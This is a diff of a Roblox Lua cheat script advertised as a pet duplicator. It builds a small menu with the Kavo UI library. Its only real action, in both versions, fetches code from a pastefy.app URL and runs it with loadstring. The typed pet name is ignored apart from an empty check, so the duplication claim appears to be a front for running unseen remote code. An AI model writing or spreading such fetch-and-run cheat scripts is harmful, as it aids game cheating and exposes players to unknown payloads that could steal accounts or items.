@@ -1,24 +1,19 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Dupe Pet by Mangekoy2 | v2.0", "Serpent")
 
--- Вкладка Dupe Pet
-local DupeTab = Window:NewTab("Dupe Pet")
-local DupeSection = DupeTab:NewSection("Dupe Pet")
+-- Вкладка 1: Dupe Pet
+local Tab1 = Window:NewTab("Dupe Pet")
+local Section1 = Tab1:NewSection("DUPE PET")
 
--- Текстовое поле
-local InputField = DupeSection:NewTextBox("", "Write any pet", function(text)
-    -- Обработка введенного текста
-end)
-InputField.Instance.Size = UDim2.new(0, 250, 0, 30)
-
--- Надпись перед кнопкой
-DupeSection:NewLabel("Dupe")
-
--- Кнопка Dupe
-DupeSection:NewButton("Dupe", "", function()
-    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
+-- Один комбинированный элемент: и ввод, и действие
+Section1:NewTextBox("DUPE", "Write any pet and press Enter", function(txt)
+    if txt ~= "" then
+        loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
+    else
+        warn("You must enter a pet name!")
+    end
 end)
 
--- ОТДЕЛЬНАЯ вкладка Credits
-local CreditsTab = Window:NewTab("Credits")
-local CreditsSection = CreditsTab:NewSection("Made by Mangekoy2 | v2.0")
+-- Вкладка 2: Credits
+local Tab2 = Window:NewTab("Credits")
+local Section2 = Tab2:NewSection("Made by Mangekoy2 | v2.0")
